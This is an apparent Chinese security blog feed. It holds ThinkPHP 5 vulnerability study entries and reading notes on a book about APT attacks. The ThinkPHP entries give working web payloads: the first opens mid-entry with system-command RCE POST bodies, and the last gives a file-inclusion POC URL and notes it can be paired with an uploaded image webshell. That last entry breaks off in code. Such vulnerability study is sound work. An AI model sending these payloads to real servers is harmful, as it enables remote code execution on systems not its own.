5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>和上一个RCE直接原因一样，都是没有对控制器进行很好的合法性校验。</p><p>漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要参考资料：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln/&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;RCE1-利用缓存文件G</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RCE" scheme="https://hack-for.fun/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>《透视APT》读书笔记</title>
    <link href="https://hack-for.fun/0.html"/>
    <id>https://hack-for.fun/0.html</id>
    <published>2020-09-20T16:00:00.000Z</published>
    <updated>2020-09-22T02:51:54.505Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png"></p><h1 id="《透视APT》"><a href="#《透视APT》" class="headerlink" title="《透视APT》"></a>《透视APT》</h1><h2 id="网络空间中的对抗"><a href="#网络空间中的对抗" class="headerlink" title="网络空间中的对抗"></a>网络空间中的对抗</h2><h3 id="APT的典型事件之——“震网病毒”"><a href="#APT的典型事件之——“震网病毒”" class="headerlink" title="APT的典型事件之——“震网病毒”"></a>APT的典型事件之——“震网病毒”</h3><ul><li>目标系统：工控系统</li><li>潜伏渗透：感染了伊朗境内60%的PC</li><li>突破物理隔离：U盘(病毒检测到宿主机插上U盘则主动向U盘感染病毒)</li><li>技术水平：同时利用多个0day(微软和西门子工控系统)，体现了APT的高级性</li><li>攻击者：极有可能是敌对关系的政治势力</li><li>攻击持续性：C2服务器2005.11就完成注册,可能长达6~7年</li></ul><h3 id="APT攻击的概念"><a href="#APT攻击的概念" class="headerlink" title="APT攻击的概念"></a>APT攻击的概念</h3><ul><li><p>起源</p><ul><li>由美国一名空军上校2006年提出</li></ul></li><li><p>何时引起关注、高潮</p><ul><li>2010伊朗震网病毒、2013美国”棱镜门”事件</li></ul></li><li><p>定义</p><ul><li><p>知名第三方机构</p><ul><li><p>维基百科、Mandiant、赛门铁克、Damballa、TechTarget</p><ul><li>1.特性：高级、持续、威胁、针对。</li></ul></li></ul></li></ul></li></ul><p>2.目标动机：政治、情报、数据、经济利益<br>3.APT目标：国防、制造业、金融、科研</p><pre><code>- 奇安信威胁情报中心    - 不是一个纯粹的技术概念，泛指有组织，有计划针对特定目标的一系列攻击    - 组织        - 国家或者政府(精神支持和物质基础)        - 情报机构、网络间谍活动的攻击组织        - 经济实体、犯罪组织、恐怖主义组织    - 能力：攻击不计成本(技术成本,比如系统0day)    - 技术特点：针对性、高度隐藏(潜伏渗透周期长)、不以经济利益为直接目的、掌握0day    - 重大安全事件不一定是APT        - 重大损失的，也不一定是APT            - 2016年美国东部互联网瘫痪</code></pre><p>2018年Facebook数据泄露<br>国内酒店大量住户信息泄露</p><pre><code>        - 影响范围大的，也不一定是APT            - 2017年WannaCry勒索病毒        - 针对性强的，也不一定是APT            - 2008年8月俄罗斯对格鲁吉亚的军事行动- APT 与威胁情报    - 威胁情报：安全机构所掌握的、针对特定组织机构的各种网络威胁信息，而该组织机构自身可能并不知道相关威胁的存在或细节        - 威胁情报的主要方面            - 源头、目标、动机、工具、指标、表象、影响、方案</code></pre><h3 id="相关研究"><a href="#相关研究" class="headerlink" title="相关研究"></a>相关研究</h3><ul><li>在全球范围内，APT研究美国和俄罗斯两国属世界一流，中国属全球第二梯队的排头兵</li><li>行业领域：军队与国防、政府、金融、外交、能源、科研、医疗、传媒、电信</li><li>目标地域：全球绝大部分的国家和地区。韩国、中东、美国、俄罗斯、巴基斯坦等国家APT最为活跃</li></ul><h2 id="APT攻击的对象"><a href="#APT攻击的对象" class="headerlink" title="APT攻击的对象"></a>APT攻击的对象</h2><h3 id="工控系统"><a href="#工控系统" class="headerlink" title="工控系统"></a>工控系统</h3><ul><li><p>乌克兰圣诞大停电事件</p><ul><li>核心攻击方式：BlackEnergy 后门程序、攻击者可远程访问并操控电力控制系统</li></ul></li><li><p>沙特阿拉伯大赦之夜攻击事件</p><ul><li><p>核心攻击方式：Shamoon(Disttrack)，能够导致目标网络完全瘫痪(通过当前的权限来访问活动目录、相同域及局域网其他主机进行横向移动)</p><ul><li>投放器(Dropper)</li><li>通信组件(Communications)</li><li>擦除组件(Wiper)</li></ul></li></ul></li><li><p>美国电网承包商攻击事件</p><ul><li>核心攻击方式：渗透网站，向网站上传恶意程序，利用恶意程序跟踪网站访问者，获得相关人员的账号密码，利用该账号发送大量钓鱼邮件</li></ul></li></ul><h3 id="金融系统"><a href="#金融系统" class="headerlink" title="金融系统"></a>金融系统</h3><ul><li><p>多国银行被盗事件</p><ul><li>核心攻击方式：<br>获得银行SWIFT权限，利用SWIFI向其他银行发送转账指令、篡改MT9XX报文清除证据</li></ul></li><li><p>ATM 机盗窃事件</p><ul><li>核心攻击方式：</li></ul></li></ul><p>1.针对性入侵金融机构员工的计算机或银行网络，进行视频监控，查看和记录负责转账系统的银行员工屏幕。获取足够的信息后，模仿银行员工的行为进行恶意操作。<br>2.插入特别制造的芯片(EMV)卡，植入恶意程序，吐钞的同时让计算机断网<br>3.入侵其他资产，通过资产内代理进行授权交易<br>4.入侵内部网络、获得ATM控制权限<br>5.通过光驱、USB接口等直接对ATM机进行操作</p><ul><li><p>黄金眼(国内APT组织)行动事件</p><ul><li>核心攻击方式：以合法软件开发公司伪装，以不当盈利作为目的，长期从事敏感金融交易信息窃取活动。（该组织攻击水平和反侦察能力均达到国际水平)</li></ul></li></ul><h3 id="地缘政治"><a href="#地缘政治" class="headerlink" title="地缘政治"></a>地缘政治</h3><ul><li><p>DNC邮件泄露、美国大选</p><ul><li>希拉里邮件门事件，利用私人电子邮件向家里私人服务器发送大量涉及国家机密的绝密邮件，大约6万封。</li><li>相关细节：希拉里竞选团队主席被钓鱼攻击上钩，泄露邮箱密码，从而获取邮箱中的邮件，同样的攻击方法在团队其他成员中也相继成功。钓鱼邮件使用了(Bitly)短链接技术来进行伪装。</li></ul></li><li><p>法国总统大选</p><ul><li>攻击组织：APT-28<br>文档:Trump’s_Attack_On_Syria_English.docx<br>核心攻击技术：<br>CVE-2017-0262(Word远程代码执行)<br>CVE-2017-0263(Windows本地权限升级)</li></ul></li></ul><h3 id="教育、科研系统"><a href="#教育、科研系统" class="headerlink" title="教育、科研系统"></a>教育、科研系统</h3><ul><li>国内顶尖大学、研究院</li><li>国内海事、电信、能源、国防、军工业</li></ul><h2 id="APT攻击的技术手段"><a href="#APT攻击的技术手段" class="headerlink" title="APT攻击的技术手段"></a>APT攻击的技术手段</h2><h3 id="APT攻击的目标"><a href="#APT攻击的目标" class="headerlink" title="APT攻击的目标"></a>APT攻击的目标</h3><ul><li><p>敏感情报信息</p><ul><li><p>PC敏感文件扩展名</p><ul><li>doc,docx,ppt,pptx,xls,xlsx,rtf,wps,et,dps,pdf,txt,dwg,rar,zip,7z,exe,eml</li></ul></li><li><p>移动端敏感文件</p><ul><li>音频、照片、通话录音、录像、通话记录、通讯录、短信、手机基本信息、地理位置信息</li></ul></li><li><p>敏感情报信息窃取方式</p><ul><li>核心思想：选择性窃取（攻击者如果活动太频繁，木马与C&amp;C服务器的通信次数越多越容易暴露）。故APT组织一般只收集特定目录下的文件或者有特殊文件名的文件。</li><li>文件直接回传、Socket通信、 电子邮件</li></ul></li></ul></li><li><p>敏感文件</p></li><li><p>经济利益</p></li><li><p>持续监控</p></li><li><p>破坏</p></li><li><p>攻击目标平台</p><ul><li><p>Windows、Android、MacOS、iOS</p></li><li><p>跨平台的水坑攻击</p><ul><li>带有恶意程序的伪造Flash升级包</li></ul></li></ul></li></ul><h3 id="APT攻击的武器搭载系统"><a href="#APT攻击的武器搭载系统" class="headerlink" title="APT攻击的武器搭载系统"></a>APT攻击的武器搭载系统</h3><ul><li><p>鱼叉攻击(Spear Phishing)</p><ul><li><p>目的：不通过授权访问机密数据</p></li><li><p>手段：最常见的方式是通过电子邮件发送给特定的攻击目标，诱使目标打开附件，这种方式就是鱼叉邮件。</p><ul><li>钓鱼邮件：这个概念和鱼叉邮件类似。不过，钓鱼多是针对普通人的攻击，针对性较弱，精确度较低。</li></ul></li><li><p>实施过程：前期准备-&gt;邮件制作-&gt;邮件投放-&gt;情报回收</p></li><li><p>防护方法：稍微有点安全意识即可，认真查看邮件来源，附件扩展名，病毒扫描，虚拟机，沙箱等。</p></li></ul></li><li><p>水坑攻击(Water Holing)</p><ul><li><p>攻击概述：攻击者通过分析攻击目标的网络活动规律，寻找攻击目标经常访问的网站的弱点，先攻下该站点并植入攻击程序，在攻击目标访问该站点时实施攻击</p></li><li><p>以海莲花APT组织的水坑攻击举例</p><ul><li><p>A方式</p><ul><li>替换目标网站的可信程序(捆绑即时通、证书驱动)</li><li>对目标网站插入恶意JavaScript程序(伪装成Adobe Flash更新程序)</li></ul></li><li><p>B方式</p><ul><li>替换目标网站站点指定链接</li></ul></li></ul></li></ul></li><li><p>PC跳板</p></li><li><p>第三方平台</p><ul><li>APT组织通过社交网络来下发C&amp;C指令，APT组织的专用木马会读取文章中的程序指令来完成指定的攻击操作</li><li>微博、Twitter、Facebook、…</li></ul></li><li><p>恶意硬件中间人劫持</p><ul><li><p>在目标网络环境中部署物理硬件设备，通过中间人方式劫持用户网络流量，替换更新包等软件</p><ul><li>输入法软件、聊天软件、下载软件、影音软件、安全软件、微软系统软件</li></ul></li><li><p>例子：火焰病毒</p></li></ul></li></ul><h3 id="APT攻击的武器装备"><a href="#APT攻击的武器装备" class="headerlink" title="APT攻击的武器装备"></a>APT攻击的武器装备</h3><ul><li><p>专用木马</p><ul><li><p>开机自启动</p><ul><li><p>修改快捷方式</p></li><li><p>DLL(动态链接库)劫持</p></li><li><p>修改注册表、服务、计划任务</p></li><li><p>APT组织为何放弃开机自启动？</p><ul><li><p>特定场景下需要一次性攻击</p><ul><li>火力侦察判断目标是否为真实目标时、目标防护能力很强时（都是为了隐藏自己的攻击</li></ul></li><li><p>依赖原始母体文件运行</p></li><li><p>用其他方法启动木马</p><ul><li>注入到其他进程、或者捆绑到其他软件</li><li>利用漏洞劫持篡改网络流量</li></ul></li></ul></li></ul></li><li><p>加密与自加密</p></li><li><p>木马升级换代</p></li></ul></li><li><p>1day \ nday</p><ul><li><p>出于攻击技术成本考虑、目标系统存在大量已知漏洞但未修复</p></li><li><p>相关例子</p><ul><li><p>CVE-2012-0158</p><ul><li>微软Office漏洞(非常稳定)，远程攻击者诱使目标打开一个经过特殊构造的RTF文件，在符合漏洞条件下，即可在目标机器上执行任意指令。</li></ul></li><li><p>CVE-2015-0097</p><ul><li>微软Office的一个逻辑漏洞，可导致目标通过HTA文件下载恶意程序到本机并执行</li></ul></li><li><p>Android 漏洞</p></li></ul></li></ul></li><li><p>0day</p><ul><li>Office 文档漏洞</li><li>Windows 提权漏洞</li><li>Flash 漏洞</li><li>其他0day</li></ul></li><li><p>APT组织武器使用成本原则(0day、或者技术成本较高的攻击手段)</p><ul><li>攻击目标具有足够的攻击价值</li><li>一般的专用木马攻击无效或者无法达到预期目的</li><li>利用1day、nday攻击依然无法达到目的或者无效</li></ul></li><li><p>APT武器研发趋势</p><ul><li><p>特别关注点：RAT(Remote Access Trojan)文件,远程访问木马的文件格式、文件形态、功能形态、恶意程序寄宿位置的变化</p></li><li><p>相关武器研发趋势</p><ul><li><p>从PE到非PE，从有实体到无实体</p></li><li><p>小众编程语言日渐流行(Delphi\GCC\NSIS\AutoIt</p></li><li><p>模块互动，云控技术渐成主流</p></li><li><p>恶意程序寄宿位置越藏越深：从常见的系统目录到难以追踪的MBR, VBR, 磁盘固件, EFI, BIOS, 移动存储设备的隐藏分区</p></li><li><p>独立研发与委托定制成主流</p><ul><li>使用公开的RAT，目的是自我隐藏和嫁祸他人</li><li>绝大部分的APT组织都是在相对独立的环境下完成攻击代码的开发工作</li><li>不排除委托第三方组成协助定制开发的可能性</li></ul></li></ul></li></ul></li></ul><h3 id="APT攻击的-C-amp-C-Command-and-Control"><a href="#APT攻击的-C-amp-C-Command-and-Control" class="headerlink" title="APT攻击的 C&amp;C(Command and Control)"></a>APT攻击的 C&amp;C(Command and Control)</h3><ul><li>主要作用：</li></ul><p>1.向感染了目标机的木马程序发送控制命令，提供下载资源(新木马，木马模块，配置文件等)<br>2.回收木马程序收集到的情报信息，包括文件、邮件等</p><ul><li><p>地域分布</p><ul><li><p>美国最多、其次中国、俄罗斯，西班牙，德国并列第三(2015年)</p><ul><li>一个APT组织可能拥有数十个，或者几个分布于不同地域的C&amp;C服务器</li></ul></li></ul></li><li><p>注册机构</p><ul><li><p>国内外APT组织均使用或部分使用境外服务商动态域名，ChangIP,DynDNS,No-IP,Afraid(FreeDNS),dnsExit</p><ul><li>动态域名的好处：</li></ul></li></ul></li></ul><p>1.相关注册信息不对外公开(无whois信息)<br>2.需要域名持有者的权限才能查询相关信息</p><ul><li><p>注册偏好</p><ul><li><p>模仿邮箱类</p><ul><li>126mailserver 、mail163等</li></ul></li><li><p>模仿杀毒软件类</p><ul><li>safe360、rising等</li></ul></li><li><p>模仿互联网公司类</p><ul><li>360sc2、sohu、sogou、sina等</li></ul></li></ul></li></ul><h2 id="APT攻击的战术布阵"><a href="#APT攻击的战术布阵" class="headerlink" title="APT攻击的战术布阵"></a>APT攻击的战术布阵</h2><h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><ul><li><p>重要性：APT组织发动一次攻击，绝大部分时间都会消耗在情报收集环节上。为了达到攻击目的，攻击者必须尽可能地全面的收集攻击目标相关的情报信息，从认知水平到掌握水平。</p></li><li><p>公开情报收集</p><ul><li>官方网站、行业网站、学术期刊、行业会议、新闻报道等</li></ul></li><li><p>地下情报收集</p><ul><li>地下黑市购买社工库</li><li>入侵第三方网站以获取目标人员、组织的情报信息</li><li>向其他APT组织购买情报信息</li></ul></li></ul><h3 id="火力侦察"><a href="#火力侦察" class="headerlink" title="火力侦察"></a>火力侦察</h3><ul><li>目的：收集攻击目标网络或设备的基本信息、判断攻击目标的真伪(是否为虚拟机)、防御能力、攻击价值。以及方便后期横向移动的准确性。</li><li>主机信息：操作系统信息、主机名称、本地用户名等</li><li>网络信息：主要是IP地址、网关信息</li><li>应用程序信息及相关版本信息，微软Office、微软Internet Explorer</li><li>磁盘信息、当前进程信息等</li></ul><h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h3><ul><li><p>攻击原理</p><ul><li>当攻击目标本身的防御措施特别完善时，或初始攻击无法达到效果，对目标相关的周边企业、人员、供应链进行攻击，有可能取得较好的效果。</li></ul></li><li><p>典型案例</p><ul><li>震网病毒、Havex</li></ul></li></ul><h3 id="假旗行动"><a href="#假旗行动" class="headerlink" title="假旗行动"></a>假旗行动</h3><ul><li><p>概述</p><ul><li><p>也叫伪旗行动，是隐蔽行动的一种。通过使用其他组织的旗帜、制服等手段误导公众、使公众认为该攻击是其他攻击组织执行。</p><ul><li>相关战术术语：拟态、诱饵、混淆、伪装、干扰</li></ul></li></ul></li><li><p>类型</p><ul><li><p>预设陷阱</p><ul><li>样本文件、C&amp;C服务器域名、特殊字符串、上线密码、诱饵文档属性信息等</li></ul></li><li><p>事后掩盖</p><ul><li>攻击成功后，对域名whois、IP地址等信息进行伪装</li></ul></li></ul></li><li><p>冒充对象</p><ul><li>冒充其他APT组织</li><li>冒充普通用户</li></ul></li><li><p>国家级情报机构对该行动的观点</p><ul><li><p>五眼联盟</p><ul><li>与欺骗相关的策略：暗区(DarkSpace)、蜜罐(Honeypot)、蜜令(Honeytoken)、蜜网(Honeynet)、假旗行动(False Flag)、效果(Effects)</li></ul></li><li><p>五眼联盟对假旗行动的观点：1.有意制造攻击目标与被嫁祸国或组织间紧张的敌对气氛，以实现某种政治或经济目的 2.更好地隐藏自己，避免暴露，收获更大利益。</p></li></ul></li></ul><h3 id="周期性袭扰"><a href="#周期性袭扰" class="headerlink" title="周期性袭扰"></a>周期性袭扰</h3><ul><li>周一、二（工作日处理邮件、文件高峰期）</li><li>大型节日（如国庆节、春节等）</li></ul><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><ul><li>目的：</li></ul><p>1.进一步在感染的目标机器上获取更多有价值的信息<br>2. 借助受感染的机器，探测周边其他设备的情况或直接向周边设备发动攻击</p><ul><li><p>横向移动攻击步骤</p><ul><li>侦察和识别网络拓扑、获取域计算机信息、当前计算机相关主机信息、网卡信息、路由信息等</li><li>查看远程计算机服务及状态、获取指定IP共享信息、共享目录、扫描内网机器远程端口等</li><li>补充原有木马没有的功能、窃取本机更多信息、向周边其他设备发动攻击</li><li>常用命令：net view、ipconfig /all、netstat -a/n、nbstat -A、systeminfo、tracert -w 1000 8.8.8.8、ping、telnet、利用PowerShell远程加载木马或者上传情报信息到C&amp;C服务器</li></ul></li></ul><h3 id="伪装术"><a href="#伪装术" class="headerlink" title="伪装术"></a>伪装术</h3><ul><li><p>社会工程学伪装</p><ul><li>邮件内容伪装</li><li>邮件身份伪装</li></ul></li><li><p>文件视觉伪装</p><ul><li>文件名</li><li>文件扩展名</li><li>文件图标</li></ul></li><li><p>快捷方式伪装</p><ul><li>将攻击代码文件和一个指向攻击代码的快捷方式文件打包成一个压缩包，同时，快捷方式的命名具有迷惑性</li></ul></li><li><p>捆绑合法程序</p><ul><li><p>AWVS7</p><ul><li>针对网络安全行业</li></ul></li><li><p>办公软件</p><ul><li>政府单位、事业单位</li></ul></li><li><p>即时通、证书驱动</p><ul><li>政府机构</li></ul></li><li><p>微软更新程序</p></li><li><p>Microsoft Visio Professional 2013</p></li></ul></li><li><p>压缩包外壳</p><ul><li>将木马程序进行压缩，以压缩包的形式传播</li></ul></li></ul><h3 id="反侦察术"><a href="#反侦察术" class="headerlink" title="反侦察术"></a>反侦察术</h3><ul><li>一些APT组织的攻击木马会判断自身所处的环境、发现杀软时、会选择放弃执行后续的功能代码、或者设法绕过杀软的监测。</li><li>一些APT组织会对安全研究人员进行反向侦察工作，比如海莲花组织向AWVS的破解版中插入了木马。</li></ul><h2 id="APT攻击的监测与防御"><a href="#APT攻击的监测与防御" class="headerlink" title="APT攻击的监测与防御"></a>APT攻击的监测与防御</h2><h3 id="如何发现APT攻击"><a href="#如何发现APT攻击" class="headerlink" title="如何发现APT攻击"></a>如何发现APT攻击</h3><ul><li><p>大数据技术</p><ul><li>数据采集、数据分析、数据呈现</li></ul></li><li><p>威胁情报技术</p><ul><li><p>“标志”(Indicator of Compromise,IOC),也叫入侵指示器：通常包括主机活动中出现的文件、进程、注册表键值、系统服务、网络上的域名、URL、IP等</p></li><li><p>分类</p><ul><li><p>战术情报</p><ul><li>标记攻击者使用工具相关的特纸值及网络基础设施信息、可直接用于设备、实现对攻击活动的监控，IOC即是一个典型</li></ul></li><li><p>作战情报</p><ul><li>描述攻击者的工具、技术和过程，即TTP</li></ul></li><li><p>战略情报</p><ul><li>描述当前对于特定组织的威胁类型和对手现状、指导安全投资的大方向。使用者为CSO(Chief Security Officer), CISO(Chief Information Security Offier)</li></ul></li></ul></li><li><p>威胁情报的利用</p><ul><li><p>~在准备阶段、检测与分析阶段、隔离，清除，与恢复阶段、事后复盘阶段的作用</p></li><li><p>安全运营团队会遇到的问题</p><ul><li>如何高效地发现攻击和入侵活动，评估影响面</li><li>如何获取、处置与已经发现安全事件相关的活动</li><li>如何基于对对手的了解、设置各个环节上的安全控制措施、以阻止相同对手或类似攻击手法的入侵</li><li>理解目前安全威胁的全貌、实现有效的安全投资</li></ul></li></ul></li></ul></li><li><p>流量威胁检测技术</p><ul><li>流量威胁分析</li><li>流量日志存储</li><li>威胁回溯分析</li></ul></li><li><p>网络检测响应技术(Network-based Detection and Response,NDR)</p></li><li><p>终端检测响应技术(Endpoint Detection and Response,EDR)</p><ul><li>基于终端大数据分析的新一代终端安全产品，能对终端行为数据进行全面采集、实时上传、对终端进行持续检测和分析、增强对内部威胁事件的深度可见性，结合相关威胁情报中心推送的情报信息(IP、URL、文件Hash等)能帮助企业快速发现，精确定位高级威胁入侵</li></ul></li></ul><h3 id="如何分析APT攻击"><a href="#如何分析APT攻击" class="headerlink" title="如何分析APT攻击"></a>如何分析APT攻击</h3><ul><li><p>网络杀伤链模型(Cyber Kill Chain)</p><ul><li><p>侦察</p><ul><li>攻击者选择目标、进行研究、搜集目标弱点</li></ul></li><li><p>武器化</p><ul><li>攻击者创建针对一个或多个漏洞定制的远程访问恶意程序武器，比如病毒或蠕虫</li></ul></li><li><p>散布</p><ul><li>将网络武器包向目标投放</li></ul></li><li><p>恶用</p><ul><li>在受害者系统上运行代码</li></ul></li><li><p>设置</p><ul><li>在目标位置安装恶意程序</li></ul></li><li><p>命令和控制</p><ul><li>为攻击者建立可远程控制目标系统的路径</li></ul></li><li><p>目标达成</p><ul><li>攻击者远程完成其预期效果</li></ul></li></ul></li><li><p>钻石模型</p><ul><li><p>攻击者</p><ul><li>分清攻击者有利用了解其目的、归属、适应性和持久性</li></ul></li><li><p>能力</p><ul><li>事件中使用的工具或技术</li></ul></li><li><p>基础设施</p><ul><li>攻击者用来传递能力的物理或逻辑结构，如IP地址、域名、邮件地址、USB设备等</li></ul></li><li><p>受害者</p><ul><li>以社会-政治为支点的安全分析中，受害者作用重大</li></ul></li></ul></li><li><p>自适应安全架构(Adaptive Security Architecture,ASA)</p><ul><li>由美国安全公司Gartner于2014年提出的面向未来的下一代安全架构，从预测、防御、检测、响应四个维度，强度安全防护是一个持续处理、循环的过程，是细粒度、多角度、持续化地对安全威胁进行实时动态分析</li><li>目的：为了解决当前企业的安全防护功能难以应对高级定向攻击的问题</li><li>最终效果：达到网络安全的可管、可控、可视、可调度、可持续</li></ul></li></ul><h3 id="协同联动的纵深防御体系"><a href="#协同联动的纵深防御体系" class="headerlink" title="协同联动的纵深防御体系"></a>协同联动的纵深防御体系</h3><ul><li><p>高级安全威胁的判定</p><ul><li>结合多源头威胁情报应用、沙箱动态行为发现、关联引擎分析</li></ul></li><li><p>安全威胁的处置</p><ul><li>NDR与EDR联动</li></ul></li></ul><h2 id="APT攻击技术-趋势"><a href="#APT攻击技术-趋势" class="headerlink" title="APT攻击技术(趋势)"></a>APT攻击技术(趋势)</h2><h3 id="技术越发高超"><a href="#技术越发高超" class="headerlink" title="技术越发高超"></a>技术越发高超</h3><ul><li><p>非PE文件文件攻击</p><ul><li>文件无需长期驻留磁盘</li><li>核心Payload存放在网络或注册表</li><li>通过系统进程执行Payload</li></ul></li><li><p>开源工具和自动化攻击框架</p><ul><li><p>PowerShell自动化攻击框架</p></li><li><p>CobaltStrike</p><ul><li>Shellcode</li><li>Beacon</li></ul></li><li><p>Koadic</p></li></ul></li><li><p>“Living off the land”技术</p></li></ul><h3 id="国际冲突地区的APT攻击更加活跃"><a href="#国际冲突地区的APT攻击更加活跃" class="headerlink" title="国际冲突地区的APT攻击更加活跃"></a>国际冲突地区的APT攻击更加活跃</h3><ul><li>能源资源、工业、持有不同政见者</li><li>这类APT组织：黄金鼠、人面狮、APT33、APT34等</li></ul><h3 id="网络空间已成为大国博弈新战场"><a href="#网络空间已成为大国博弈新战场" class="headerlink" title="网络空间已成为大国博弈新战场"></a>网络空间已成为大国博弈新战场</h3><ul><li>影响面：政治、经济、军事谈判等</li></ul><h3 id="针对基础设施的破坏性攻击日益活跃"><a href="#针对基础设施的破坏性攻击日益活跃" class="headerlink" title="针对基础设施的破坏性攻击日益活跃"></a>针对基础设施的破坏性攻击日益活跃</h3><ul><li>“互联网+”、5G、万物互联等新兴技术的兴起</li><li>涉及行业：能源、交通、制造、金融、通信等领域</li><li>现状：很多基础设施和生产系统的网络安全体系建设还基本为零</li></ul><h3 id="针对个人移动终端攻击显著增加"><a href="#针对个人移动终端攻击显著增加" class="headerlink" title="针对个人移动终端攻击显著增加"></a>针对个人移动终端攻击显著增加</h3><ul><li>iOS、Android</li><li>系统漏洞、社会工程学</li><li>典型例子：“三叉戟漏洞”</li></ul><h2 id="典型的APT组织机构"><a href="#典型的APT组织机构" class="headerlink" title="典型的APT组织机构"></a>典型的APT组织机构</h2><h3 id="方程式"><a href="#方程式" class="headerlink" title="方程式"></a>方程式</h3><h3 id="索伦之眼"><a href="#索伦之眼" class="headerlink" title="索伦之眼"></a>索伦之眼</h3><h3 id="APT28"><a href="#APT28" class="headerlink" title="APT28"></a>APT28</h3><h3 id="Lazarus"><a href="#Lazarus" class="headerlink" title="Lazarus"></a>Lazarus</h3><h3 id="Group123"><a href="#Group123" class="headerlink" title="Group123"></a>Group123</h3><h2 id="当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。"><a href="#当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。" class="headerlink" title="当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。"></a>当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。</h2><p><em>XMind - Trial Version</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;《透视APT》&quot;&gt;&lt;a href=&quot;#《透视APT》&quot; class=&quot;hea</summary>
      
    
    
    
    
    <category term="APT" scheme="https://hack-for.fun/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-文件包含漏洞</title>
    <link href="https://hack-for.fun/8d0f.html"/>
    <id>https://hack-for.fun/8d0f.html</id>
    <published>2020-09-16T05:10:50.000Z</published>
    <updated>2021-05-25T09:50:01.097Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ThinkPHP5文件包含漏洞"><a href="#ThinkPHP5文件包含漏洞" class="headerlink" title="ThinkPHP5文件包含漏洞"></a>ThinkPHP5文件包含漏洞</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index?cacheFile&#x3D;favicon.ico</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916231827.png" alt="image-20200916135216791"></p><p>可配合文件上传图片马，GetShell。(PHP 文件包含都讲文件当做php后缀文件进行解析，与实际文件类型无关)</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>漏洞存在于 <strong>ThinkPHP</strong> 模板引擎中，在加载模版解析变量时存在<strong>变量覆盖</strong>问题，而且程序没有对数据进行很好的过滤，最终导致 <strong>文件包含漏洞</strong> 的产生。</p><ul><li>变量覆盖漏洞</li></ul><p><a href="https://www.cnblogs.com/wangtanzhi/p/12748967.html">https://www.cnblogs.com/wangtanzhi/p/12748967.html</a></p><p><strong>如果没有指定 flags，则被假定为 EXTR_OVERWRITE。</strong></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span 